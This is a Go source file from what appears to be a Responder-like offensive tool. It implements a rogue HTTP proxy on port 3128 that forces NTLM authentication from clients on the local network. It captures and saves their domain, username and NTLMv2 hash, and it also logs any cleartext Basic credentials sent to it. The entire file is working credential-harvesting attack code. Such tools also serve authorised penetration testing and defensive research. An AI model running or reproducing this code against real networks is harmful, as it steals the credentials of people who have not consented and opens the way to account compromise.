package server

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"

	"go-responder/internal/core"
)

func ServeProxy(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:3128", ifaceIP))
	if err != nil {
		core.LogError("Proxy listen :3128 - %v (need root?)", err)
		return
	}
	core.LogInfo("Proxy listening on %s:3128 (HTTP NTLM proxy)", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go HandleProxy(c)
	}
}

func HandleProxy(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(30 * time.Second))

	challenge := core.GetChallenge()
	r := bufio.NewReader(c)
	challengeIssued := false

	for {
		requestLine, err := r.ReadString('\n')
		if err != nil {
			return
		}
		requestLine = strings.TrimRight(requestLine, "\r\n")

		if requestLine == "" {
			continue
		}

		headers := make(map[string]string)
		for {
			line, err := r.ReadString('\n')
			if err != nil {
				return
			}
			line = strings.TrimRight(line, "\r\n")
			if line == "" {
				break
			}
			idx := strings.Index(line, ":")
			if idx > 0 {
				key := strings.ToLower(strings.TrimSpace(line[:idx]))
				val := strings.TrimSpace(line[idx+1:])
				headers[key] = val
			}
		}

		proxyAuth := headers["proxy-authorization"]

		if proxyAuth == "" || strings.ToUpper(proxyAuth) == "NTLM" {
			core.LogVerbose("Proxy connection from %s - requesting NTLM auth", c.RemoteAddr())
			sendProxyResponse(c, 407, "NTLM", nil)
			continue
		}

		if !strings.HasPrefix(strings.ToUpper(proxyAuth), "NTLM ") {
			parts := strings.SplitN(proxyAuth, " ", 2)
			if len(parts) == 2 {
				decoded, err := base64.StdEncoding.DecodeString(parts[1])
				if err == nil {
					core.LogSuccess("[Proxy] Cleartext auth from %s: %s", c.RemoteAddr(), string(decoded))
				}
			}
			sendProxyResponse(c, 407, "NTLM", nil)
			return
		}

		raw, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(proxyAuth[5:], " "))
		if err != nil {
			sendProxyResponse(c, 407, "NTLM", nil)
			return
		}

		ntlm := core.FindNTLMSSP(raw)
		if len(ntlm) < 12 {
			sendProxyResponse(c, 407, "NTLM", nil)
			return
		}

		switch core.NTLMMsgType(ntlm) {
		case 1:
			challengeIssued = true
			ntlmChal := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
			encoded := base64.StdEncoding.EncodeToString(ntlmChal)
			core.LogVerbose("Proxy NTLM Type1 from %s - issuing challenge", c.RemoteAddr())
			sendProxyResponse(c, 407, "NTLM "+encoded, nil)

		case 3:
			if !challengeIssued {
				sendProxyResponse(c, 407, "NTLM", nil)
				return
			}
			hash, user, domain, err := core.ParseNTLMAuthenticate(ntlm, challenge)
			if err != nil {
				core.LogVerbose("Proxy NTLM parse: %v", err)
				sendProxyResponse(c, 407, "NTLM", nil)
				return
			}
			core.LogSuccess("[Proxy] NTLMv2 captured from %s", c.RemoteAddr())
			core.LogSuccess("        %s\\%s", domain, user)
			core.LogSuccess("        %s", hash)
			core.SaveHash(hash)
			sendProxyResponse(c, 407, "NTLM", nil)
			return

		default:
			sendProxyResponse(c, 407, "NTLM", nil)
			return
		}
	}
}

func sendProxyResponse(c net.Conn, code int, proxyAuth string, body []byte) {
	status := "Proxy Authentication Required"
	if code == 200 {
		status = "OK"
	}
	resp := fmt.Sprintf("HTTP/1.1 %d %s\r\n", code, status)
	if proxyAuth != "" {
		resp += "Proxy-Authenticate: " + proxyAuth + "\r\n"
	}
	resp += "Content-Length: 0\r\n"
	resp += "Connection: keep-alive\r\n"
	resp += "\r\n"
	c.Write([]byte(resp))
	if body != nil {
		c.Write(body)
	}
}
